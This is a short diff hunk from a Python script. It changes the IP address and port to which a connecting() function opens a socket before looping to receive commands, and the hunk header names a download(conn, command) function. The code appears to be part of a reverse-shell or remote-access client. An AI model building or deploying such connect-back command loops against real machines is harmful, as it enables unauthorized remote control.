@@ -35,7 +35,7 @@ def download(conn, command):
 
 def connecting():
     s = socket.socket()
-    s.connect(("192.168.1.24", 4445))
+    s.connect(("192.168.1.23", 4448))
 
     while True:
         command = s.recv(1024)
